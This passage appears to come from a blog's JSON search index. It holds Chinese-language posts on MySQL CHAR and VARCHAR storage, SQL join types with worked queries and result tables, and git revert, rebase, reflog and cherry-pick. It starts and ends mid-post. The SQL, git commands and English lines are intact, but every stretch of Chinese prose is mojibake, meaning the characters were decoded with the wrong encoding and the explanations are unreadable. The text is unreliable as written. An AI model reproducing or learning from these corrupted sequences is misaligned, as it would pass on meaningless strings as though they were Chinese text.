é•¿åº¦é™åˆ¶\n\nCHARåˆ—çš„é•¿åº¦å›ºå®šä¸ºåˆ›å»ºè¡¨æ—¶å£°æ˜çš„é•¿åº¦ã€‚é•¿åº¦å¯ä»¥æ˜¯0åˆ°255ä¹‹é—´çš„ä»»ä½•å€¼ã€‚\n\nVARCHARåˆ—ä¸­çš„å€¼æ˜¯å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚é•¿åº¦å¯ä»¥æŒ‡å®šä¸º0åˆ°65535ä¹‹é—´çš„å€¼ã€‚VARCHARçš„æœ‰æ•ˆæœ€å¤§é•¿åº¦å–å†³äºæœ€å¤§è¡Œå¤§å°å’Œä½¿ç”¨çš„å­—ç¬¦é›†ã€‚\n\n### 3.2 å¡«ç©ºå’Œæˆªæ–­\n\nå½“å­˜å‚¨CHARå€¼æ—¶ï¼Œå°†ä½¿ç”¨æŒ‡å®šé•¿åº¦çš„ç©ºæ ¼å¯¹å…¶è¿›è¡Œå³å¡«å……ã€‚\n\nVARCHARå€¼åœ¨å­˜å‚¨æ—¶ä¸å¡«å……ã€‚åœ¨å­˜å‚¨å’Œæ£€ç´¢å€¼æ—¶ï¼Œå°¾éƒ¨ç©ºæ ¼å°†è¢«ä¿ç•™ï¼Œè¿™ä¸æ ‡å‡†SQLä¸€è‡´ã€‚\n\n\n\nå¦‚æœæœªå¯ç”¨strict SQLæ¨¡å¼ï¼Œå¹¶ä¸”å°†å€¼åˆ†é…ç»™è¶…è¿‡è¯¥åˆ—æœ€å¤§é•¿åº¦çš„CHARæˆ–VARCHARåˆ—ï¼Œåˆ™ä¼šæˆªæ–­è¯¥å€¼ä»¥é€‚åˆè¯¥åˆ—ï¼Œå¹¶ç”Ÿæˆè­¦å‘Šã€‚\n\nå¯¹äºéç©ºæ ¼å­—ç¬¦çš„æˆªæ–­ï¼Œå¯ä»¥ä½¿ç”¨strict SQLæ¨¡å¼å¯¼è‡´å‘ç”Ÿé”™è¯¯ï¼ˆè€Œä¸æ˜¯è­¦å‘Šï¼‰å¹¶ç¦æ­¢æ’å…¥å€¼ã€‚\n\n### 3.3 ç¤ºä¾‹\n\nä¸‹è¡¨é€šè¿‡æ˜¾ç¤ºå°†å„ç§å­—ç¬¦ä¸²å€¼å­˜å‚¨åˆ°CHARï¼ˆ4ï¼‰å’ŒVARCHARï¼ˆ4ï¼‰åˆ—ä¸­çš„ç»“æœï¼ˆå‡è®¾åˆ—ä½¿ç”¨å•å­—èŠ‚å­—ç¬¦é›†ï¼Œå¦‚latin1ï¼‰ï¼Œè¯´æ˜äº†CHARå’ŒVARCHARä¹‹é—´çš„åŒºåˆ«ã€‚\n\n| Value      | CHAR(4) | Storage Required | VARCHAR(4) | Storage Required |\n| ---------- | ------- | ---------------- | ---------- | ---------------- |\n| ''         | '  '    | 4 bytes          | ''         | 1 byte           |\n| 'ab'       | 'ab '   | 4 bytes          | 'ab'       | 3 bytes          |\n| 'abcd'     | 'abcd'  | 4 bytes          | 'abcd'     | 5 bytes          |\n| 'abcdefgh' | 'abcd'  | 4 bytes          | 'abcd'     | 5 bytes          |\n\n\n\n# 10. å‚è€ƒèµ„æ–™\n\n+ https://dev.mysql.com/doc/refman/8.0/en/numeric-type-syntax.html\n+ https://dev.mysql.com/doc/refman/8.0/en/char.html\n+ https://stackoverflow.com/a/3003533\n+ https://dev.mysql.com/doc/refman/8.0/en/index-condition-pushdown-optimization.html","tags":["mysql"],"categories":["mysql"]},{"title":"mysqlçš„joinä»‹ç»","url":"%2Fp%2F289dcf0b.html","content":"\n\n\n# 1.  joinç±»å‹\n\nåœ¨å…³ç³»ä»£æ•°ä¸­ï¼Œè¿æ¥è¿ç®—æ˜¯ç”±ä¸€ä¸ªç¬›å¡å°”ç§¯è¿ç®—å’Œä¸€ä¸ªé€‰å–è¿ç®—æ„æˆçš„ã€‚é¦–å…ˆç”¨ç¬›å¡å°”ç§¯å®Œæˆå¯¹ä¸¤ä¸ªæ•°æ®é›†åˆçš„ä¹˜è¿ç®—ï¼Œç„¶åå¯¹ç”Ÿæˆçš„ç»“æœé›†åˆè¿›è¡Œé€‰å–è¿ç®—ï¼Œç¡®ä¿åªæŠŠåˆ†åˆ«æ¥è‡ªä¸¤ä¸ªæ•°æ®é›†åˆå¹¶ä¸”å…·æœ‰é‡å éƒ¨åˆ†çš„è¡Œåˆå¹¶åœ¨ä¸€èµ·ã€‚\n\nè¿æ¥çš„å…¨éƒ¨æ„ä¹‰åœ¨äºåœ¨æ°´å¹³æ–¹å‘ä¸Šåˆå¹¶ä¸¤ä¸ªæ•°æ®é›†åˆï¼ˆé€šå¸¸æ˜¯è¡¨ï¼‰ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªæ–°çš„ç»“æœé›†åˆï¼Œå…¶æ–¹æ³•æ˜¯å°†ä¸€ä¸ªæ•°æ®æºä¸­çš„è¡Œäºå¦ä¸€ä¸ªæ•°æ®æºä¸­å’Œå®ƒåŒ¹é…çš„è¡Œç»„åˆæˆä¸€ä¸ªæ–°å…ƒç»„ã€‚\n\nSQLæä¾›äº†å¤šç§ç±»å‹çš„è¿æ¥æ–¹å¼ï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºï¼šä»ç›¸äº’äº¤å çš„ä¸åŒæ•°æ®é›†åˆä¸­é€‰æ‹©ç”¨äºè¿æ¥çš„è¡Œæ—¶æ‰€é‡‡ç”¨çš„æ–¹æ³•ä¸åŒã€‚\n\n<!-- more -->\n\n### 1.1  joinåˆ†ç±»\n\n| è¿æ¥ç±»å‹   | è¿æ¥ç§ç±»         | å®šä¹‰                                                         |\n| ---------- | ---------------- | ------------------------------------------------------------ |\n| Inner Join | Inner Join       | å†…è¿æ¥æ˜¯æœ€å¸¸è§çš„ä¸€ç§è¿æ¥ï¼Œå®ƒä¹Ÿè¢«ç§°ä¸ºæ™®é€šè¿æ¥ï¼Œåªè¿æ¥åŒ¹é…çš„è¡Œï¼ˆä»…å¯¹æ»¡è¶³è¿æ¥æ¡ä»¶çš„CROSSä¸­çš„åˆ—ï¼‰ã€‚å®ƒåˆåˆ†ä¸ºç­‰å€¼è¿æ¥ï¼ˆè¿æ¥æ¡ä»¶è¿ç®—ç¬¦ä¸º\"=\"ï¼‰å’Œä¸ç­‰å€¼è¿æ¥ï¼ˆè¿æ¥æ¡ä»¶è¿ç®—ç¬¦ä¸ä¸º\"=\"ï¼Œä¾‹å¦‚between...andï¼‰ã€‚ |\n| Outer Join | Full Outer Join  | FULL JOIN ä¼šä»å·¦è¡¨ å’Œå³è¡¨ é‚£é‡Œè¿”å›æ‰€æœ‰çš„è¡Œã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨çš„æ•°æ®è¡Œåœ¨å¦ä¸€ä¸ªè¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œé‚£ä¹ˆå¯¹é¢çš„æ•°æ®ç”¨NULLä»£æ›¿ã€‚ |\n| Outer Join | Left Outer Join  | LEFT JOINè¿”å›å·¦è¡¨çš„å…¨éƒ¨è¡Œå’Œå³è¡¨æ»¡è¶³ONæ¡ä»¶çš„è¡Œï¼Œå¦‚æœå·¦è¡¨çš„è¡Œåœ¨å³è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œå³è¡¨ä¸­å¯¹åº”æ•°æ®ç”¨NULLä»£æ›¿ã€‚ |\n| Outer Join | Right Outer Join | RIGHT JOINè¿”å›å³è¡¨çš„å…¨éƒ¨è¡Œå’Œå·¦è¡¨æ»¡è¶³ONæ¡ä»¶çš„è¡Œï¼Œå¦‚æœå³è¡¨çš„è¡Œåœ¨å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œå·¦è¡¨ä¸­å¯¹åº”æ•°æ®ç”¨NULLä»£æ›¿ã€‚ |\n| Cross Join | Cross Join       | CROSSå¯¹ä¸¤ä¸ªè¡¨æ‰§è¡Œç¬›å¡å°”ä¹˜ç§¯ã€‚å®ƒä¸ºå·¦è¡¨è¡Œå’Œå³è¡¨è¡Œçš„æ¯ç§å¯èƒ½çš„ç»„åˆè¿”å›ä¸€è¡Œã€‚è¿”å›ï¼ˆå·¦è¡¨è¡Œæ•°*å³è¡¨è¡Œæ•°ï¼‰è¡Œçš„è¡¨ã€‚ |\n| å…¶ä»–       | è‡ªç„¶è¿æ¥         | è‡ªç„¶è¿æ¥æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç­‰å€¼è¿æ¥,åœ¨è¿æ¥æ¡ä»¶ä¸­ä½¿ç”¨ç­‰äº(=)è¿ç®—ç¬¦æ¯”è¾ƒè¢«è¿æ¥åˆ—çš„åˆ—å€¼ï¼Œä½†å®ƒä½¿ç”¨é€‰æ‹©åˆ—è¡¨æŒ‡å‡ºæŸ¥è¯¢ç»“æœé›†åˆä¸­æ‰€åŒ…æ‹¬çš„åˆ—ï¼Œå¹¶åˆ é™¤è¿æ¥è¡¨ä¸­çš„é‡å¤åˆ—ã€‚ |\n| å…¶ä»–       | è‡ªè¿æ¥           | æŸä¸ªè¡¨å’Œå…¶è‡ªèº«è¿æ¥ï¼Œå¸¸ç”¨åœ¨åŒä¸€è¡¨å†…ä¸åŒæ•°æ®é—´å¯¹åŒä¸€åˆ—çš„æ¯”è¾ƒ   |\n\n\n\n### 1.2 å¸¸è§åˆ†ç±»\n\nThere are 4 different types of Oracle joins:\n\n- Oracle INNER JOIN (or sometimes called simple join)\n- Oracle LEFT OUTER JOIN (or sometimes called LEFT JOIN)\n- Oracle RIGHT OUTER JOIN (or sometimes called RIGHT JOIN)\n- Oracle FULL OUTER JOIN (or sometimes called FULL JOIN)\n\n\n\n# 2. joinä½¿ç”¨\n\n**Examples**\n\n```sql\nA    B\n-    -\n1    3\n2    4\n3    5\n4    6\n```\n\n**Inner join**\n\n```sql\nselect * from a INNER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a = b.b;\n\na | b\n--+--\n3 | 3\n4 | 4\n```\n\n**Left outer join**\n\n```sql\nselect * from a LEFT OUTER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a = b.b(+);\n\na |  b\n--+-----\n1 | null\n2 | null\n3 |    3\n4 |    4\n```\n\n**Right outer join**\n\n```sql\nselect * from a RIGHT OUTER JOIN b on a.a = b.b;\nselect a.*, b.*  from a,b where a.a(+) = b.b;\n\na    |  b\n-----+----\n3    |  3\n4    |  4\nnull |  5\nnull |  6\n```\n\n\n\n**Full outer join**\n\n```sql\nselect * from a FULL OUTER JOIN b on a.a = b.b;\n\n a   |  b\n-----+-----\n   1 | null\n   2 | null\n   3 |    3\n   4 |    4\nnull |    6\nnull |    5\n```\n\n\n\n# 3. joinåŒºåˆ«\n\n### 3.1 inner join, outer join\n\n- An inner join of A and B gives the result of A intersect B\n- An outer join of A and B gives the results of A union B\n\n![1](mysqlçš„joinä»‹ç»/1.png)\n\n\n\n\n\n### 3.2 inner join å’Œ å¤šè¡¨è¿æŸ¥ ä¸€è‡´\n\n```sql\nSELECT * FROM\ntable a INNER JOIN table b\nON a.id = b.id;\n```\n\nvs\n\n```sql\nSELECT a.*, b.*\nFROM table a, table b\nWHERE a.id = b.id;\n```\n\nå¤šè¡¨è¿æŸ¥, å¸¦ where æ¡ä»¶çš„ä¸€èˆ¬åˆç§°ä¸ºéšå¼å†…è¿æ¥,  åœ¨æ€§èƒ½æ–¹é¢ï¼Œå®ƒä»¬æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚\n\n\n\n### 3.3  left join å’Œ å¤šè¡¨è¿æŸ¥ åŒºåˆ«\n\nå®é™…é¡¹ç›®ä¸­, æœ€å¸¸ç”¨çš„ä¸¤ç§æ–¹å¼.\n\n+  left join å°±æ˜¯ left outer join, ä¸€èˆ¬ä¼šäº§ç”Ÿ null\n+ å¤šè¡¨æŸ¥è¯¢åŠ  where, å¯ä»¥ç†è§£ä¸º inner join\n\n\n\n### 3.4 on, where çš„åŒºåˆ«\n\n+ å¯¹äºinner joins, æ— å…³ç´§è¦\n\n+ å¯¹äº outer joins, å…ˆ on å where\n\n  + `ON` clause - **Before** joining.    åœ¨joinä¹‹å‰å°†è¢«è¿‡æ»¤,  æœ‰äº›ç»“æœå¯èƒ½ä¸ºnullï¼ˆå› ä¸ºouter joinï¼‰ã€‚\n\n  + `WHERE` clause: **After** joining.   åœ¨joinä¹‹åè¿‡æ»¤è®°å½•, **ä¸€èˆ¬å¯ä»¥è¿‡æ»¤æ‰ null**ã€‚\n\n    \n\nâ€œA LEFT JOIN B ON æ¡ä»¶è¡¨è¾¾å¼â€ ä¸­çš„ONç”¨æ¥å†³å®šå¦‚ä½•ä» B è¡¨ä¸­æ£€ç´¢æ•°æ®è¡Œã€‚å¦‚æœ B è¡¨ä¸­æ²¡æœ‰ä»»ä½•ä¸€è¡Œæ•°æ®åŒ¹é… ON çš„æ¡ä»¶,å°†ä¼šé¢å¤–ç”Ÿæˆä¸€è¡Œæ‰€æœ‰åˆ—ä¸º NULL çš„æ•°æ®ã€‚ä»…åœ¨åŒ¹é…é˜¶æ®µå®Œæˆä»¥åï¼ŒWHERE å­å¥æ¡ä»¶æ‰ä¼šè¢«ä½¿ç”¨ã€‚å®ƒå°†ä»åŒ¹é…é˜¶æ®µäº§ç”Ÿçš„æ•°æ®ä¸­æ£€ç´¢è¿‡æ»¤ã€‚\n\n\n\næ‰€ä»¥æˆ‘ä»¬è¦æ³¨æ„ï¼šåœ¨ä½¿ç”¨Left (right) joinçš„æ—¶å€™ï¼Œä¸€å®šè¦åœ¨å…ˆç»™å‡ºå°½å¯èƒ½å¤šçš„åŒ¹é…æ»¡è¶³æ¡ä»¶ï¼Œå‡å°‘Whereçš„æ‰§è¡Œã€‚å¦‚ï¼š\n\n```sql\nselect * from A\ninner join B on B.name = A.name\nleft join C on C.name = B.name\nleft join D on D.id = C.id\nwhere C.status>1 and D.status=1;\n\n--å¯ä»¥ä¼˜åŒ–æˆ:\n\nselect * from A\ninner join B on B.name = A.name\nleft join C on C.name = B.name and C.status>1\nleft join D on D.id = C.id and D.status=1\n```\n\n\n\n**Example**\n\n```sql\n    1. documents:\n     | id    | name        |\n     --------|-------------|\n     | 1     | Document1   |\n     | 2     | Document2   |\n     | 3     | Document3   |\n     | 4     | Document4   |\n     | 5     | Document5   |\n\n\n    2. downloads:\n     | id   | document_id   | username |\n     |------|---------------|----------|\n     | 1    | 1             | sandeep  |\n     | 2    | 1             | simi     |\n     | 3    | 2             | sandeep  |\n     | 4    | 2             | reya     |\n     | 5    | 3             | simi     |\n```\n\n\n\n**ON**\n\n```sql\nSELECT documents.name, downloads.id FROM documents LEFT OUTER JOIN downloads\nON documents.id = downloads.document_id\nAND username = 'sandeep'\n\nä¸­é—´è¡¨:\n    | id(from documents) | name         | id (from downloads) | document_id | username |\n    |--------------------|--------------|---------------------|-------------|----------|\n    | 1                  | Document1    | 1                   | 1           | sandeep  |\n    | 2                  | Document2    | 3                   | 2           | sandeep  |\n    | 3                  | Document3    | NULL                | NULL        | NULL     |\n    | 4                  | Document4    | NULL                | NULL        | NULL     |\n    | 5                  | Document5    | NULL                | NULL        | NULL     |\n\næ³¨æ„â€œ documentsâ€ä¸­ä¸ç¬¦åˆè¿™ä¸¤ä¸ªæ¡ä»¶çš„è¡Œæ˜¯å¦‚ä½•ç”¨â€œ NULLâ€å€¼å¡«å……çš„ã€‚\n\næœ€ç»ˆ:\n   | name       | id   |\n   |------------|------|\n   |  Document1 | 1    |\n   |  Document2 | 3    | \n   |  Document3 | NULL |\n   |  Document4 | NULL | \n   |  Document5 | NULL | \n```\n\n\n\n**WHERE**\n\n```sql\n SELECT documents.name, downloads.id FROM documents LEFT OUTER JOIN downloads\n ON documents.id = downloads.document_id\n WHERE username = 'sandeep'\n\n å…ˆ on äº§ç”Ÿä¸­é—´è¡¨:\n\n    | id(from documents) | name         | id (from downloads) | document_id | username |\n    |--------------------|--------------|---------------------|-------------|----------|\n    | 1                  | Document1    | 1                   | 1           | sandeep  |\n    | 1                  | Document1    | 2                   | 1           | simi     |\n    | 2                  | Document2    | 3                   | 2           | sandeep  |\n    | 2                  | Document2    | 4                   | 2           | reya     |\n    | 3                  | Document3    | 5                   | 3           | simi     |\n    | 4                  | Document4    | NULL                | NULL        | NULL     |\n    | 5                  | Document5    | NULL                | NULL        | NULL     |\n\næœ€ç»ˆç»“æœ:\n\n   | name         | id |\n   |--------------|----|\n   | Document1    | 1  |\n   | Document2    | 3  | \n```\n\n\n\n### 3.5 mysql å®ç° full join(å…¨å¤–è¿æ¥)\n\n mysql  é»˜è®¤ä¸æ”¯æŒ full join, ä½†æ˜¯å¯ä»¥ç”¨ä¸‹é¢å®ç°\n\n```sql\nSELECT * FROM t1\nLEFT JOIN t2 ON t1.id = t2.id\nUNION\nSELECT * FROM t1\nRIGHT JOIN t2 ON t1.id = t2.id\n```\n\n\n\n# 4. cross join çœŸæ­£ç¬›å¡å°”ä¹˜ç§¯æŸ¥è¯¢\n\n### 4.1 cross join , inner join\n\näº¤å‰è”æ¥ä¸ä¼šåˆå¹¶è¡Œï¼Œå¦‚æœæ¯ä¸ªè¡¨ä¸­æœ‰100è¡Œä¸”ä¸€ä¸€åŒ¹é…ï¼Œåˆ™ä¼šå¾—åˆ°10000ä¸ªç»“æœï¼Œåœ¨ç›¸åŒæƒ…å†µä¸‹ï¼ŒInnerjoinå°†ä»…è¿”å›100è¡Œã€‚\n\nè¿™ä¸¤ä¸ªç¤ºä¾‹å°†è¿”å›ç›¸åŒçš„ç»“æœï¼š\n\nCross join\n\n```sql\nselect * from table1 cross join table2 where table1.id = table2.fk_id\n```\n\nInner join\n\n```sql\nselect * from table1 join table2 on table1.id = table2.fk_id\n```\n\nUse the last method\n\n\n\n### 4.2 cross join, full outer joinåŒºåˆ«\n\n+  cross join\n\n  äº¤å‰è”æ¥ä¼šåœ¨ä¸¤ä¸ªè¡¨ä¹‹é—´äº§ç”Ÿç¬›å¡å°”ä¹˜ç§¯ï¼Œå¹¶è¿”å›æ‰€æœ‰è¡Œçš„æ‰€æœ‰å¯èƒ½ç»„åˆã€‚ å®ƒæ²¡æœ‰onå­å¥ï¼Œå› ä¸ºæ‚¨åªæ˜¯å°†æ‰€æœ‰å†…å®¹è¿æ¥åˆ°æ‰€æœ‰å†…å®¹ã€‚\n\n  ä½¿ç”¨ç©ºè¡¨ï¼ˆæˆ–ç»“æœé›†ï¼‰çš„äº¤å‰è”æ¥ä¼šå¯¼è‡´ç©ºè¡¨ï¼ˆM x Nï¼›å› æ­¤M x 0 = 0)\n\n+ full outer join\n\n  å®Œå…¨å¤–éƒ¨è”æ¥æ˜¯å·¦å¤–éƒ¨è”æ¥å’Œå³å¤–éƒ¨è”æ¥çš„ç»„åˆã€‚ å®ƒè¿”å›ä¸¤ä¸ªè¡¨ä¸­ä¸æŸ¥è¯¢çš„whereå­å¥åŒ¹é…çš„æ‰€æœ‰è¡Œï¼Œå¹¶ä¸”åœ¨æ— æ³•æ»¡è¶³è¿™äº›è¡Œçš„æ‰“å¼€æ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œå®ƒå°†ä¸ºæœªå¡«å……çš„å­—æ®µæ”¾å…¥ç©ºå€¼ã€‚\n\n  å®Œå…¨å¤–éƒ¨è”æ¥å°†å§‹ç»ˆå…·æœ‰è¡Œï¼Œé™¤éMå’ŒNå‡ä¸º0ã€‚\n\n\n\n### 4.3 mysql ä¸­cross join\n\nåœ¨Mysqlä¸­,cross join ,inner joinå’Œ joinæ‰€å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ã€‚å› æ­¤åœ¨MYSQLçš„å®˜æ–¹æ–‡æ¡£ä¸­ï¼ŒæŒ‡æ˜äº†ä¸‰è€…æ˜¯ç­‰ä»·çš„å…³ç³»ã€‚\n\nhttps://dev.mysql.com/doc/refman/5.7/en/join.html\n\nIn MySQL, JOIN, CROSS JOIN, and INNER JOIN are syntactic equivalents (they can replace each other). In standard SQL, they are not equivalent. INNER JOIN is used with an ON clause, CROSS JOIN is used otherwise.\n\n\n\n# 5. å¤´è„‘é£æš´\n\n### 5.1 ç­‰ä»·è¡Œä¸º\n\n+  LEFT JOIN and LEFT OUTER JOIN å®Œå…¨ä¸€æ ·,  RIGHT JOIN and RIGHT OUTER JOIN å®Œå…¨ä¸€æ ·\n+  JOIN é»˜è®¤æƒ…å†µä¸‹æ˜¯ INNER JOIN, MySQLä¸­,cross join ,inner joinå’Œ joinæ‰€å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ã€‚\n\n### 5.2 æŸ¥è¯¢é¡ºåº\n\n+  å¯¹äºINNER JOINï¼Œé¡ºåºæ— å…³ç´§è¦, å¯¹äºï¼ˆLEFTï¼ŒRIGHTæˆ–FULLï¼‰OUTER JOINï¼Œé¡ºåºå¾ˆé‡è¦\n\n### 5.3 æ€§èƒ½\n\n+ INNER JOIN å’Œ LEFT JOIN çš„æ€§èƒ½\n\n  1. å¦‚æœå®ƒä»¬è¿”å›ç›¸åŒçš„ç»“æœï¼Œåˆ™å®ƒä»¬çš„é€Ÿåº¦ç›¸åŒã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»è®°ä½å®ƒä»¬ä¸æ˜¯ç›¸åŒçš„æŸ¥è¯¢ï¼Œå¹¶ä¸”LEFT JOINå¯èƒ½ä¼šè¿”å›æ›´å¤šçš„ç»“æœï¼ˆå½“æŸäº›ONæ¡ä»¶ä¸æ»¡è¶³æ—¶ï¼‰--è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®ƒé€šå¸¸æ¯”è¾ƒæ…¢çš„åŸå› ã€‚\n\n  2. å½“ä¸»è¡¨ï¼ˆæ‰§è¡Œè®¡åˆ’ä¸­çš„ç¬¬ä¸€ä¸ªè¡¨ï¼‰å…·æœ‰é™åˆ¶æ¡ä»¶ï¼ˆå…¶ä¸­id=ï¼Ÿï¼‰è€Œç›¸åº”çš„ONæ¡ä»¶ä¸ºç©ºå€¼ï¼Œåˆ™â€œrightâ€è¡¨æœªè”æ¥â€”â€”æ­¤æ—¶LEFTè”æ¥é€Ÿåº¦æ›´å¿«ã€‚\n\n  3. å¦‚ç¬¬1ç‚¹æ‰€è®¨è®ºçš„ï¼Œé€šå¸¸INNER JOINé™åˆ¶æ›´ä¸¥æ ¼ï¼Œè¿”å›çš„ç»“æœæ›´å°‘ï¼Œå› æ­¤é€Ÿåº¦æ›´å¿«ã€‚\n\n  \n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/u012861978/article/details/52203818\n+ https://stackoverflow.com/a/38578\n+ https://stackoverflow.com/a/17759769\n+ https://stackoverflow.com/questions/3228871\n+ https://stackoverflow.com/questions/44917\n+ https://stackoverflow.com/a/28719292\n+ https://stackoverflow.com/a/20981676\n+ https://stackoverflow.com/a/4796911","tags":["sql"],"categories":["mysql"]},{"title":"gité­”æ³•æ“ä½œ","url":"%2Fp%2F92ab0521.html","content":"\n# 1. revert\n\nrevertä»¥æ–°å¢ä¸€ä¸ª commit çš„æ–¹å¼è¿˜åŸæŸä¸€ä¸ª commit çš„ä¿®æ”¹ã€‚è¿™æ˜¯ä¸€ä¸ªå®‰å…¨çš„æ–¹æ³•ï¼Œå› ä¸ºå®ƒä¸ä¼šé‡å†™æäº¤å†å²ã€‚\n\n```bash\ngit revert <commit-id>\n```\n\n<!-- more -->\n\n```bash\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n\n# æ’¤é”€ä¸Šä¸€æ¬¡æäº¤\ngit revert d38ece4\n\n\n* edaa22e - Revert \"add 1\" (2 minutes ago) <liuwei>\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n\n\n# æˆ‘å†æ’¤ä¸Šä¸€æ¬¡æ’¤å›çš„æäº¤\ngit revert edaa22e\n\n* 71903f8 - (HEAD -> cherry) Revert \"Revert \"add 1\"\" (50 seconds ago) <liuwei>\n* edaa22e - Revert \"add 1\" (2 minutes ago) <liuwei>\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n```\n\n\n\nå¦‚æœä¸ºäº†commitå¹²å‡€, å¯ä»¥ä½¿ç”¨`reset --hard +  push -f `(é™¤éä½ çŸ¥é“ä½ åœ¨å¹²ä»€ä¹ˆ)\n\n\n\n# 2. rebase\n\nåˆå¹¶åˆ†æ”¯æ—¶å€™, merge æ›´å®‰å…¨, ä¿ç•™çš„ä¿¡æ¯æ›´å¤š,  ä½†æ˜¯æ ‘ç»“æ„ä¼šäº¤é”™ã€‚rebase ä¼šä¿è¯æ•´ä¸ªæäº¤æ ‘ç‰¹åˆ«æ•´é½ã€‚\n\nåœ¨ä½ è¿è¡Œ git rebase ä¹‹å‰ï¼Œä¸€å®šè¦é—®é—®ä½ è‡ªå·±ã€Œæœ‰æ²¡æœ‰åˆ«äººæ­£åœ¨è¿™ä¸ªåˆ†æ”¯ä¸Šå·¥ä½œï¼Ÿã€ã€‚å¦‚æœç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œé‚£ä¹ˆæŠŠä½ çš„çˆªå­æ”¾å›å»ã€‚\n\n### 2.1  rebaseä»‹ç»\n\nrebase ç®—æ˜¯gitçš„ä¸€ä¸ªé»‘é­”æ³•, å¦‚æœä¸ä¼šrebase, åˆ«è¯´ä¼šç”¨gitã€‚\n\nç§»æ­¥:  https://www.liuvv.com/p/b1718ace.html\n\n\n\n### 2.2 git pull --rebase\n\nå½“ä½ åœ¨æœ¬åœ°ç«¯çš„masteråˆ†æ”¯å¼€å‘æ—¶ï¼Œä½ commitäº†ä¸€ä¸ªå°æ”¹å˜ã€‚åŒæ—¶å…¶ä»–äººå°†ä»–æœ¬å‘¨çš„ä¿®æ”¹æ¨ä¸Šäº†è¿œåœ°masteråˆ†æ”¯ã€‚å½“ä½ è¯•ç€æ¨ä¸Šä½ çš„commitæ—¶ï¼Œgitä¼šè¦æ±‚ä½ å…ˆåšgit pullçš„åŠ¨ä½œã€‚\n\nå½“ä½ ä¸‹äº†git pullæ—¶ï¼Œgitä¼šå¸®ä½ äº§ç”Ÿä¸€ä¸ª`Merge remtoe-tracking branch â€˜origin/masterâ€™` çš„ commitã€‚\n\nè™½ç„¶è¿™æ²¡ä»€ä¹ˆå¤§ä¸äº†çš„ï¼Œä½†æ˜¯è¿™è®©logçœ‹èµ·æ¥æœ‰ç‚¹æ··ä¹±äº†ã€‚è¿™ä¸ªä¾‹å­å¯ä»¥ä½¿ç”¨`git pull --rebase`ã€‚\n\nè¿™ä¼šå…ˆå¼ºåˆ¶gitæŠ“å–(pull)è¿œåœ°çš„ä¿®æ”¹ï¼Œç„¶åå†é‡æ–°æ¥ä¸Š(re-apply[rebase])ä½ å°šæœªæ¨åˆ°è¿œåœ°ç«¯çš„commitï¼Œå¹¶ä¸”æ¨ä¸Šä½ çš„commitã€‚è¿™æ ·ä¸€æ¥gitè‡ªåŠ¨äº§ç”Ÿçš„Merge remote-trackingçš„logå°±ä¸ä¼šå‡ºç°äº†ã€‚\n\n\n\n# 3. å…¶ä»–\n\n### 3.1 å®ç”¨æ“ä½œ\n\nç§»æ­¥:  https://www.liuvv.com/p/42eae4e7.html\n\n### 3.2 cherry-pick\n\nç§»æ­¥:  https://www.liuvv.com/p/6aa4bbd5.html\n\n### 3.3 blame\n\næŸ¥çœ‹æŸæ®µä»£ç æ˜¯è°å†™çš„, blame çš„æ„æ€ä¸ºâ€˜è´£æ€ªâ€™ï¼Œä½ æ‡‚çš„ã€‚\n\n```bash\ngit blame <file-name>\n```\n\n### 3.4 reflog(æ•‘å‘½å¤§æ‹›)\n\nå½“éªšæ“ä½œå‡ºç°é—®é¢˜çš„æ—¶å€™, ä¾‹å¦‚ reset, merge, rebase ä¸­æ–­äº†,  å¦‚æœä½ æ‰¾ä¸åˆ°commit hash, ä¼šä¸ä¼šå¥”æºƒ?\n\næ¯æ¬¡æ›´æ–°äº† HEAD çš„ git å‘½ä»¤æ¯”å¦‚ commintã€amendã€cherry-pickã€resetã€revert ç­‰éƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼ˆä¸é™åˆ†æ”¯ï¼‰ï¼Œå°±åƒ shell çš„ history ä¸€æ ·ã€‚ å¯ä»¥é€šè¿‡reflogæŸ¥çœ‹ã€‚ \n\n```bash\ngit reflog\n```\n\n### 3.5 æŸ¥çœ‹åˆ†æ”¯æ–‡ä»¶\n\n```bash\ngit show master:go.mod\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n\n+ https://github.com/521xueweihan/git-tips\n+ https://github.com/geeeeeeeeek/git-recipes","tags":["git"],"categories":["git"]},{"title":"gitçš„cherry-pickçš„ä½¿ç”¨","url":"%2Fp%2F6aa4bbd5.html","content":"\nå¯¹äºå¤šåˆ†æ”¯çš„ä»£ç åº“ï¼Œå°†ä»£ç ä»ä¸€ä¸ªåˆ†æ”¯è½¬ç§»åˆ°å¦ä¸€ä¸ªåˆ†æ”¯æ˜¯å¸¸è§éœ€æ±‚ã€‚\n\nä¸€ç§æƒ…å†µæ˜¯ï¼Œä½ éœ€è¦å¦ä¸€ä¸ªåˆ†æ”¯çš„æ‰€æœ‰ä»£ç å˜åŠ¨ï¼Œé‚£ä¹ˆå°±é‡‡ç”¨åˆå¹¶ï¼ˆgit merge æˆ– git rebaseï¼‰ã€‚\n\nå¦ä¸€ç§æƒ…å†µæ˜¯ï¼Œä½ åªéœ€è¦éƒ¨åˆ†ä»£ç å˜åŠ¨ï¼ˆæŸå‡ 